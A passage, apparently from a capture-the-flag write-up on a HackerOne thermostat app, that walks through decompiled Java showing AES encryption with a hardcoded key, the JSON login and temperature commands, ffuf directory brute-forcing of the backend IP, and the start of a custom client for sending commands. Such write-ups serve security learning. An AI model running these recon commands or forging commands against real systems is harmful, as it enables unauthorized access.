class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eSecretKeySpec\u003c/span\u003e \u003cspan class=\"n\"\u003esecretKeySpec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eSecretKeySpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]{(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e56\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e79\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e46\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e106\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e26\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e27\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e34\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e59\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eByte\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eMIN_VALUE\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e23\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e90\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"mi\"\u003e116\u003c/span\u003e\u003cspan class=\"o\"\u003e},\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;AES\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003ebArr\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n        \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nf\"\u003eSecureRandom\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003enextBytes\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ebArr\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eIvParameterSpec\u003c/span\u003e \u003cspan class=\"n\"\u003eivParameterSpec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eIvParameterSpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ebArr\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e \u003cspan class=\"n\"\u003einstance\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetInstance\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;AES/CBC/PKCS5Padding\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003einstance\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003einit\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003esecretKeySpec\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eivParameterSpec\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003edoFinal\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003einstance\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edoFinal\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etoString\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetBytes\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n        \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003ebArr2\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[(\u003c/span\u003e\u003cspan class=\"n\"\u003edoFinal\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e)];\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003earraycopy\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ebArr\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ebArr2\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003earraycopy\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edoFinal\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ebArr2\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edoFinal\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elength\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003eBase64\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eencodeToString\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ebArr2\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe \u003ccode\u003ebuildPayload\u003c/code\u003e method uses a symmetric-key algorithm [4] (AES) in CBC mode that uses the same cryptographic key for both encryption of plaintext and decryption of ciphertext. Moreover, the \u003ccode\u003esecretKeySpec\u003c/code\u003e is the key and PKCS#5 is the padding method. Thus our json is always sent encrypted to the backend server. Futhermore, there is a method to decript the response, called \u003ccode\u003eparseNetworkResponse\u003c/code\u003e, which uses the same algorithm and secret key.\u003c/p\u003e\n\n\u003ch3 id=\"thermostatactivity-class\"\u003eThermostatActivity.class\u003c/h3\u003e\n\n\u003cp\u003eThe other ActivityClass is the \u003ccode\u003eThermostatActivity\u003c/code\u003e which calls \u003ccode\u003esetTargetTemperature\u003c/code\u003e two times and updates the \u003ccode\u003ethermostatModel\u003c/code\u003e attribute. Also using the same json object from \u003ccode\u003eLoginActivity\u003c/code\u003e sends a \u003ccode\u003egetTemp\u003c/code\u003e command, but as you can see, does nothing with the result (\u003ccode\u003eString str\u003c/code\u003e)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003esetDefaults\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efinal\u003c/span\u003e \u003cspan class=\"nc\"\u003eThermostatModel\u003c/span\u003e \u003cspan class=\"n\"\u003ethermostatModel\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ethermostatModel\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetTargetTemperature\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eInteger\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003evalueOf\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e77\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ethermostatModel\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetCurrentTemperature\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eInteger\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003evalueOf\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e76\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eLoginActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eusername\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eLoginActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003epassword\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;getTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"n\"\u003evolleyQueue\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eadd\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eListener\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"n\"\u003ethermostatModel\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetTargetTemperature\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eInteger\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003evalueOf\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e70\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n                \u003cspan class=\"n\"\u003ethermostatModel\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetCurrentTemperature\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eInteger\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003evalueOf\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e73\u003c/span\u003e\u003cspan class=\"o\"\u003e));\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}));\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"com-hackerone-thermostat-model-thermostatmodel\"\u003ecom.hackerone.thermostat.Model.ThermostatModel\u003c/h3\u003e\n\n\u003cp\u003eAnalyzing the other classes we find a \u003ccode\u003eThermostatModel\u003c/code\u003e with a \u003ccode\u003esetTargetTemperatute\u003c/code\u003e method which gives us another command: \u003ccode\u003esetTemp\u003c/code\u003e. What is interesting about this new command is that now we have a new json attributes \u003ccode\u003etemp\u003c/code\u003e which is the \u003ccode\u003esetTemp\u003c/code\u003e parameter. \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003esetTargetTemperature\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eInteger\u003c/span\u003e \u003cspan class=\"n\"\u003enum\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etargetTemperature\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetValue\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003enum\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"k\"\u003etry\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eLoginActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eusername\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eLoginActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003epassword\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;cmd\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;setTemp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;temp\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003enum\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eThermostatActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003evolleyQueue\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eadd\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eListener\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonResponse\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n            \u003cspan class=\"o\"\u003e}));\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003ecatch\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"n\"\u003eunused\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eupdateCooling\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch3 id=\"dir-brute\"\u003eDir Brute\u003c/h3\u003e\n\n\u003cp\u003eWhy not? We have an IP running a web server so let\u0026#39;s check if we are in a lucky day and get some low hanging fruits figuring out a hidden endpoint. Using FFUF [12]:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e./ffuf \u003cspan class=\"nt\"\u003e-u\u003c/span\u003e http://35.243.186.41/FUZZ \u003cspan class=\"nt\"\u003e-w\u003c/span\u003e wordlists/SecLists/Discovery/Web-Content/big.txt\n./ffuf \u003cspan class=\"nt\"\u003e-u\u003c/span\u003e http://35.243.186.41/FUZZ \u003cspan class=\"nt\"\u003e-w\u003c/span\u003e wordlists/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eNot that easy ...\u003c/p\u003e\n\n\u003ch3 id=\"creating-a-java-application\"\u003eCreating a Java Application\u003c/h3\u003e\n\n\u003cp\u003eAfter this initial recon, it\u0026#39;s time to try some attacks interacting with the backend server. For this, I just created a java application using the same source code from the App with minor changes.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e    \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kd\"\u003estatic\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003esendCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003eusername\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003epassword\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"n\"\u003ecmd\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nc\"\u003ePayloadRequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esendCommand\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eusername\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003epassword\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecmd\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\n    \u003cspan 